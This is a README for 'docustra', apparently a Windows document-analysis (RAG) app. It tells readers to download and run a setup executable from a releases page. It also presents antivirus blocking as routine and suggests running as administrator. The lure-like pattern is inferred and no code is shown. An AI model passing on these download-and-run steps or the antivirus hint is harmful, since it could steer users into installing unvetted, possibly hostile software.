# 📑 docustra - Extract insights from complex document sets

[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Accessible-sloughing768/docustra/releases)

Docustra simplifies complex document analysis. It uses advanced intelligence to read your files, answer questions, and provide accurate citations. This tool helps you manage information stored in PDFs, text files, and spreadsheets without manual searching.

## 📥 How to Install

1. Visit the [official releases page](https://github.com/Accessible-sloughing768/docustra/releases).
2. Locate the latest version of the installer under the Assets section.
3. Download the file named `docustra-setup.exe`.
4. Run the installer by double-clicking the file.
5. Follow the on-screen prompts to complete the installation process.
6. Launch the application from your desktop shortcut once finished.

## 🛠 System Requirements

Docustra works on standard Windows machines. Ensure your computer meets these conditions:

*   **Operating System:** Windows 10 or Windows 11.
*   **Processor:** Intel Core i5 or AMD Ryzen 5 equivalent or better.
*   **Memory:** At least 8 GB of RAM.
*   **Storage:** 2 GB of free disk space for the program and database files.
*   **Network:** An active internet connection to download updates and connect to intelligence services.

## ⚙️ Setting Up Your Environment

The first time you open Docustra, the software checks for necessary background components. 

1. Allow the application access through your system firewall if prompted. This step ensures the software communicates with the document database properly.
2. The software initializes a local database. This happens automatically. Wait for the loading bar to reach one hundred percent.
3. You do not need to install Python, Qdrant, or Neo4j. The installer includes everything required to run the engine.

## 📝 Using Document Intelligence

Docustra organizes your files into a searchable knowledge base. Follow these steps to process your first set of documents:

1. **Import Files:** Open the main dashboard and click the "Upload" button. Select the documents you wish to analyze. The system accepts PDFs, Word documents, and text files.
2. **Indexing:** Once imported, the software processes the text structure. It maps relationships between terms using graph technology. This ensures the search engine understands context rather than just matching keywords.
3. **Querying:** Use the search bar to enter a question. For example, type "What is the primary shipping policy?" The software scans all uploaded documents and provides an answer.
4. **Citations:** Every answer includes a link to the original source. Click the citation number to view the exact page and paragraph used for the response.

## 🧠 Understanding RAG Patterns

Docustra manages information using several retrieval methods. You can choose these in the settings menu to refine your search results:

*   **Adaptive Mode:** The system chooses the best search strategy based on your question type.
*   **Agentic Mode:** An internal agent decomposes complex questions into smaller parts and answers them step-by-step.
*   **Graph Mode:** Uses knowledge graphs to find connections between disparate documents.
*   **Hybrid Mode:** Combines keyword search (BM25) with vector search to improve accuracy.
*   **Multimodal Mode:** Processes documents containing both text and charts or images.

## ☁️ Managing Your Data

Docustra keeps data on your local machine. This guarantees privacy. You control which files enter the index.

1. **Deleting Files:** Navigate to the "Library" tab. Select the document you wish to remove and press the "Delete" icon. This clears the associated data from your local memory.
2. **Database Backup:** Your document index stays in your "Documents" folder under the "DocustraData" directory. Backing up this folder protects your processed information.
3. **Clearing Cache:** If you notice slow performance, go to Settings and click "Clear Cache." This removes temporary files created during previous searches.

## 💬 Troubleshooting

If the software fails to launch or reports an error, check these items:

*   **Antivirus Software:** Sometimes programs like Windows Defender block new software. If the application refuses to open, check your protection history to see if the file was blocked.
*   **Network Connection:** Ensure your connection stays stable during the initial setup. The software downloads model definitions during its first run.
*   **Corrupt Installation:** If the application behaves unexpectedly, uninstall it via the Windows Settings menu and install it again from the latest file on the website.
*   **Missing Permissions:** Run the installer as an administrator if the installation fails during the final phase.

## 📈 Performance Monitoring

The dashboard includes a performance monitor. If you perform high-volume analysis, check the "System Status" window to view memory usage. Keeping the application updated is important for maintaining compatibility with current document formats. The software notifies you when a new release becomes available. 

## 📖 Glossary

*   **RAG:** A method that retrieves specific facts from your documents before answering a question. 
*   **Vector Database:** A storage system that organizes text by meaning instead of exact letter matches.
*   **LLM:** The intelligence core that summarizes and writes answers based on the material you provide.
*   **Knowledge Graph:** A visual map that connects concepts across different files.
*   **BM25:** A classic search algorithm that identifies exact matches for your keywords.
*   **Evaluation Gate:** A background process that checks the quality of answers before showing them to you.
*   **Prompt Versioning:** A feature that saves previous instructions so you can compare how the system answers different questions.